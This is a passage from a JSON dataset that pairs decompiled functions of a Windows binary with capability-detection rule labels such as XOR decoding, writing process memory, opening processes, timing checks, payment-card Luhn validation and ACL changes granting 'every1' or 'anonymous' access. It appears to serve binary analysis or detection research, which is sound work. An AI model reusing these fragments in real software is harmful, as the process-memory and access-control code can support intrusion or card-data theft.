        "decompiled_code": "\nbool __cdecl fcn.20027674(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    \n    iVar1 = *(arg_ch + 0xc);\n    if (*(arg_10h + 0xc) == iVar1) {\n        *(arg_8h + 0xc) = iVar1 != 0;\n        iVar1 = fcn.200273d1(arg_8h, arg_ch, arg_10h);\n        return iVar1 != 0;\n    }\n    arg_ch_00 = arg_ch;\n    if (iVar1 != 0) {\n        arg_ch_00 = arg_10h;\n        arg_10h = arg_ch;\n    }\n    iVar1 = fcn.20024882(arg_ch_00, arg_10h);\n    if (iVar1 < 0) {\n        iVar1 = fcn.200274a9(arg_8h, arg_10h, arg_ch_00);\n        if (iVar1 != 0) {\n            *(arg_8h + 0xc) = 1;\n            return true;\n        }\n    }\n    else {\n        iVar1 = fcn.200274a9(arg_8h, arg_ch_00, arg_10h);\n        if (iVar1 != 0) {\n            *(arg_8h + 0xc) = 0;\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 328
    },
    "2002b2da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2002b2da(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.2002af5f(0, param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 63
    },
    "20023e04": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20023e04(uint pAcl, char *size)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_70h;\n    uint var_ch;\n    int32_t pSid;\n    uint var_4h;\n    \n    pcVar1 = size;\n    pcVar2 = _sym.imp.ADVAPI32.dll_LookupAccountNameA;\n    if (*size == '*') {\n        pcVar1 = size + 1;\n        iVar3 = sub.ntdll.dll_strcmp(pcVar1, \"every1\");\n        if (iVar3 == 0) {\n            uVar4 = 0x20046ad8;\n        }\n        else {\n            iVar3 = sub.ntdll.dll_strcmp(pcVar1, \"anonymous\");\n            if (iVar3 != 0) {\n                return 0x21590065;\n            }\n            uVar4 = 0x20046ae4;\n        }\n        iVar3 = (*_sym.imp.ADVAPI32.dll_AddAccessAllowedAce)(pAcl, 2, 0xc0000000, uVar4);\n        if (iVar3 == 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            uVar4 = 0;\n        }\n    }\n    else {\n        uVar4 = 0;\n        size = NULL;\n        var_4h = 0;\n        (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, pcVar1, 0, &size, 0, &var_4h, &var_ch);\n        if (size == NULL) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            pSid = (*_sym.imp.msvcrt.dll_malloc)(size);\n            if (pSid == 0) {\n                uVar4 = 0x21590004;\n            }\n            else {\n                var_4h = 100;\n                iVar3 = (*pcVar2)(0, pcVar1, pSid, &size, &var_70h, &var_4h, &var_ch);\n                if ((iVar3 == 0) ||\n                   (iVar3 = (*_sym.imp.ADVAPI32.dll_AddAccessAllowedAce)(pAcl, 2, 0xc0000000, pSid),  iVar3 == 0)) {\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                }\n                (*_sym.imp.msvcrt.dll_free)(pSid);\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 580
    },
    "200012d6": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.200012d6(uint *param_1, uint param_2)\n\n{\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, param_2);\n    return;\n}\n",
        "token_count": 48
    },
    "20001628": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.20001628(uint *param_1)\n\n{\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    return;\n}\n",
        "token_count": 42
    },
    "20001644": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool fcn.20001644(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 57
    },
    "20001a1f": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.20001a1f(int32_t param_1)\n\n{\n    uint uVar1;\n    bool bVar2;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 0x14);\n    bVar2 = *(param_1 + 8) == 0;\n    if (bVar2) {\n        *(param_1 + 8) = 0xffffffff;\n    }\n    else {\n        *(param_1 + 4) = *(param_1 + 4) + 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    *(param_1 + 0x2c) = uVar1;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 0x14);\n    if (!bVar2) {\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(param_1 + 0x10), 0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "20001d55": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.20001d55(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*param_1, 0xffffffff);\n    if (iVar1 == 0) {\n        if (unaff_retaddr != 0) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*param_1, unaff_retaddr);\n        }\n        return 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 120
    },
    "200015f9": {
        "rules": [
            "check mutex"
        ],
        "decompiled_code": "\nint32_t fcn.200015f9(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = NULL;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenMutexA)(0x1f0001, 0, param_2);\n    *piVar2 = iVar1;\n    return (iVar1 != 0) - 1;\n}\n",
        "token_count": 99
    },
    "20002711": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.20002711(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    uint unaff_ESI;\n    int32_t unaff_EDI;\n    \n    puVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x1c);\n    if (puVar1 == NULL) {\n        return;\n    }\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    *puVar1 = param_1;\n    puVar1[1] = param_2;\n    puVar1[2] = unaff_ESI;\n    puVar1[3] = unaff_ESI;\n    puVar1[6] = *(unaff_EDI + 0x34);\n    *(unaff_EDI + 0x34) = puVar1;\n    return;\n}\n",
        "token_count": 188
    },
    "200173d0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint fcn.200173d0(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    \n    fcn.20001976(in_EAX + 0x1c);\n    piVar1 = *(in_EAX + 0x18);\n    if (piVar1 != NULL) {\n        do {\n            if (piVar1[1] == param_1) break;\n            piVar1 = *piVar1;\n        } while (piVar1 != NULL);\n        if (piVar1 != NULL) {\n            piVar1[3] = param_2;\n            piVar1[4] = param_3;\n            uVar2 = 1;\n            goto code_r0x2001740d;\n        }\n    }\n    uVar2 = 0;\ncode_r0x2001740d:\n    fcn.200019c5(in_EAX + 0x1c);\n    return uVar2;\n}\n",
        "token_count": 235
    },
    "2001a897": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t fcn.2001a897(uint param_1, uint param_2, ushort param_3, uint param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    \n    pcVar1 = _sym.imp.msvcrt.dll_calloc;\n    iVar2 = (*_sym.imp.msvcrt.dll_calloc)(1, 0x20);\n    if (iVar2 != 0) {\n        puVar3 = (*pcVar1)(1, 0x10);\n        if (puVar3 != NULL) {\n            *puVar3 = 2;\n            *(iVar2 + 4) = 2;\n            puVar3[1] = param_3;\n            *(iVar2 + 8) = param_1;\n            *(puVar3 + 2) = param_4;\n            *(iVar2 + 0x18) = puVar3;\n            *(iVar2 + 0xc) = param_2;\n            *(iVar2 + 0x10) = 0x10;\n            return iVar2;\n        }\n        (*_sym.imp.msvcrt.dll_free)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 262
    },
    "20024a66": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data with MD5"
        ],
        "decompiled_code": "\nvoid fcn.20024a66(uint *param_1)\n\n{\n    *param_1 = 0x67452301;\n    param_1[1] = 0xefcdab89;\n    param_1[2] = 0x98badcfe;\n    param_1[3] = 0x10325476;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[0x16] = 0;\n    return;\n}\n",
        "token_count": 114
    },
    "20001d83": {
        "rules": [
            "terminate thread"
        ],
        "decompiled_code": "\nint32_t fcn.20001d83(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_TerminateThread)(*param_1, 0xffffffff);\n    return (iVar1 != 0) - 1;\n}\n",
        "token_count": 65
    },
    "20009ac5": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint fcn.20009ac5(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x20034557 != '\\0') {\n        do {\n            *(uVar1 + 0x20034518) = *(uVar1 + 0x20034518) ^ *(uVar1 + 0x200344d8);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < 0x40);\n    }\n    return 0x20034518;\n}\n",
        "token_count": 122
    },
    "20009ae6": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint fcn.20009ae6(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x200345d7 != '\\0') {\n        do {\n            *(uVar1 + 0x20034598) = *(uVar1 + 0x20034598) ^ *(uVar1 + 0x20034558);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < 0x40);\n    }\n    return 0x20034598;\n}\n",
        "token_count": 122
    },
    "20009b07": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint fcn.20009b07(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x20034657 != '\\0') {\n        do {\n            *(uVar1 + 0x20034618) = *(uVar1 + 0x20034618) ^ *(uVar1 + 0x200345d8);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < 0x40);\n    }\n    return 0x20034618;\n}\n",
        "token_count": 122
    },
    "20009b28": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint fcn.20009b28(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x200347d7 != '\\0') {\n        do {\n            *(uVar1 + 0x20034798) = *(uVar1 + 0x20034798) ^ *(uVar1 + 0x20034758);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < 0x40);\n    }\n    return 0x20034798;\n}\n",
        "token_count": 122
    },
    "20009be1": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint fcn.20009be1(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x20034357 != '\\0') {\n        do {\n            *(uVar1 + 0x20034318) = *(uVar1 + 0x20034318) ^ *(uVar1 + 0x200342d8);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < 0x40);\n    }\n    return 0x20034318;\n}\n",
        "token_count": 122
    },
    "20009c02": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint fcn.20009c02(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (*0x20034457 != '\\0') {\n        do {\n            *(uVar1 + 0x20034418) = *(uVar1 + 0x20034418) ^ *(uVar1 + 0x200343d8);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < 0x40);\n    }\n    return 0x20034418;\n}\n",
        "token_count": 122
    },
    "2000d8f1": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.2000d8f1(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    sub.ntdll.dll_ZwReadVirtualMemory(param_1, param_2, param_4, param_5, 0);\n    return;\n}\n",
        "token_count": 70
    },
    "2000d909": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "write process memory"
        ],
        "decompiled_code": "\nvoid fcn.2000d909(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    sub.ntdll.dll_ZwWriteVirtualMemory(param_1, param_2, param_4, param_5, 0);\n    return;\n}\n",
        "token_count": 68
    },
    "2000be79": {
        "rules": [
            "open process"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000be79(uint dwProcessId, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = 0;\n    if (*0x20046e6c == 0) {\n        uVar3 = 0;\n    }\n    else {\n        iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x410, 0, dwProcessId);\n        if (iVar1 == 0) {\n            uVar3 = 0;\n        }\n        else {\n            iVar2 = (**0x20046e78)(iVar1, &var_4h, 4, &var_8h);\n            if ((iVar2 != 0) && (iVar2 = (**0x20046e80)(iVar1, var_4h, arg_ch, 0x104),  iVar2 != 0)) {\n                uVar3 = 1;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 253
    },
    "2000d9af": {
        "rules": [
            "open process"
        ],
        "decompiled_code": "\nuint fcn.2000d9af(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_1 == NULL) {\n        return 0x21590065;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(param_2, 0, param_3);\n    *param_1 = iVar1;\n    if (iVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x2000d9d6. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 175
    },
    "20001829": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.20001829(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uchar *puVar1;\n    \n    if (param_3 != 0) {\n        puVar1 = param_1 + -1 + param_3;\n        do {\n            *puVar1 = puVar1[param_2 - param_1];\n            puVar1 = puVar1 + -1;\n            param_3 = param_3 + -1;\n        } while (param_3 != 0);\n    }\n    return param_1;\n}\n",
        "token_count": 131
    },
    "20002744": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.20002744(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    for (; (in_EAX != NULL && ((*in_EAX != param_1 || (in_EAX[1] != param_2)))); in_EAX = in_EAX[6]) {\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "20002788": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.20002788(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (in_EAX == 0) {\n        return;\n    }\n    for (piVar1 = *(in_EAX + 0x10); (piVar1 != NULL && (*piVar1 != param_1)); piVar1 = piVar1[5]) {\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "200027a2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.200027a2(void)\n\n{\n    int32_t in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    \n    if (in_EAX != 0) {\n        puVar1 = *(in_EAX + 0x10);\n        if (puVar1 == NULL) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = *puVar1;\n        }\n        *(in_EAX + 0xc) = uVar2;\n        *(in_EAX + 8) = uVar2;\n        for (; puVar1 != NULL; puVar1 = puVar1[5]) {\n            if (*puVar1 < *(in_EAX + 8)) {\n                *(in_EAX + 8) = *puVar1;\n            }\n            uVar2 = *puVar1;\n            if (*(in_EAX + 0xc) <= uVar2 && uVar2 != *(in_EAX + 0xc)) {\n                *(in_EAX + 0xc) = uVar2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "2000285a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.2000285a(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    \n    if (param_3 == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        for (piVar2 = *(param_3 + 0x34); piVar2 != NULL; piVar2 = piVar2[6]) {\n            if ((*piVar2 == param_2) && (piVar2[1] == param_1)) {\n                if (piVar2[3] <= in_EAX && in_EAX != piVar2[3]) {\n                    piVar2[3] = in_EAX;\n                }\n                if (in_EAX < piVar2[2]) {\n                    piVar2[2] = in_EAX;\n                }\n                goto code_r0x20002889;\n            }\n        }\n        fcn.20002711(param_2, param_1);\ncode_r0x20002889:\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 262
    },
    "2000968a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.2000968a(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint uVar5;\n    bool bVar6;\n    \n    fcn.20001a1f(0x20046ddc);\n    puVar3 = *0x20046e14;\n    puVar4 = **0x20046e14;\n    while( true ) {\n        if (puVar4 == NULL) {\n            fcn.20001a68(0x20046ddc);\n            return 0x215901fd;\n        }\n        iVar2 = (*_sym.imp.ntdll.dll__stricmp)(puVar4 + 2, param_1);\n        if (iVar2 == 0) break;\n        puVar3 = puVar4;\n        puVar4 = *puVar4;\n    }\n    bVar6 = puVar4 == *0x20046e10;\n    pcVar1 = puVar4[0x44];\n    *puVar3 = *puVar4;\n    if (bVar6) {\n        *0x20046e10 = puVar3;\n    }\n    fcn.20001a68(0x20046ddc);\n    if (pcVar1 == NULL) {\n        uVar5 = 0x215901fe;\n    }\n    else {\n        (*pcVar1)();\n        uVar5 = 0;\n    }\n    fcn.200089de(puVar4);\n    (*_sym.imp.msvcrt.dll_free)(puVar4);\n    return uVar5;\n}\n",
        "token_count": 357
    },
    "2000d580": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000d580(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    while( true ) {\n        if (arg_8h == NULL) {\n            return 0;\n        }\n        if (arg_8h[1] == arg_ch) break;\n        arg_8h = *arg_8h;\n    }\n    if (arg_8h[2] != arg_10h) {\n        return 0;\n    }\n    *arg_14h = arg_8h[4];\n    if (arg_18h != NULL) {\n        *arg_18h = arg_8h[3];\n    }\n    return 1;\n}\n",
        "token_count": 172
    },
    "2001708f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.2001708f(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_ESI;\n    \n    iVar2 = 0;\n    fcn.20001976(unaff_ESI + 0x1c);\n    piVar1 = *(unaff_ESI + 0x18);\n    if (piVar1 != NULL) {\n        do {\n            if (piVar1[1] == param_1) break;\n            piVar1 = *piVar1;\n        } while (piVar1 != NULL);\n        if (piVar1 != NULL) {\n            iVar2 = piVar1[2];\n        }\n    }\n    fcn.200019c5(unaff_ESI + 0x1c);\n    return iVar2;\n}\n",
        "token_count": 184
    },
    "20017419": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __cdecl fcn.20017419(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t unaff_ESI;\n    bool bVar2;\n    uint var_4h;\n    \n    bVar2 = false;\n    fcn.20001976(unaff_ESI + 0x1c);\n    piVar1 = *(unaff_ESI + 0x18);\n    if (piVar1 != NULL) {\n        do {\n            if (piVar1[1] == arg_8h) break;\n            piVar1 = *piVar1;\n        } while (piVar1 != NULL);\n        if (piVar1 != NULL) {\n            *arg_ch = piVar1[3];\n            *arg_10h = piVar1[4];\n            *arg_14h = piVar1[2];\n            bVar2 = piVar1[3] != 0;\n            piVar1[3] = 0;\n            piVar1[4] = 0;\n        }\n    }\n    fcn.200019c5(unaff_ESI + 0x1c);\n    return bVar2;\n}\n",
        "token_count": 281
    },
    "2001aa9f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.2001aa9f(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        do {\n            iVar1 = fcn.2001a897();\n            if (iVar1 == 0) break;\n            *(iVar1 + 0x1c) = *(param_2 + 0x1c);\n            *(param_2 + 0x1c) = iVar1;\n            param_2 = *(iVar1 + 0x1c);\n        } while (param_2 != 0);\n        if (param_2 != 0) {\n            return 8;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 159
    },
    "2001aadf": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.2001aadf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    \n    pcVar2 = _sym.imp.msvcrt.dll_free;\n    if (param_1 != 0) {\n        do {\n            if (*(param_1 + 0x14) != 0) {\n                (*pcVar2)(*(param_1 + 0x14));\n            }\n            if (*(param_1 + 0x18) != 0) {\n                (*pcVar2)(*(param_1 + 0x18));\n            }\n            iVar1 = *(param_1 + 0x1c);\n            (*pcVar2)(param_1);\n            param_1 = iVar1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "2001bc57": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.2001bc57(void)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        do {\n            piVar1 = *in_EAX;\n            (*_sym.imp.msvcrt.dll_free)(in_EAX);\n            in_EAX = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "20023bd0": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20023bd0(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *unaff_EDI;\n    uint size;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExA;\n    *unaff_EDI = 0;\n    iVar2 = (*pcVar1)(arg_8h, arg_ch, 0, 0, 0, &size);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(size);\n        *unaff_EDI = iVar2;\n        if (iVar2 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, 0, 0, iVar2, &size);\n            if (iVar2 == 0) {\n                iVar2 = 0;\n            }\n            else {\n                (*_sym.imp.msvcrt.dll_free)(*unaff_EDI);\n                *unaff_EDI = 0;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 262
    }
}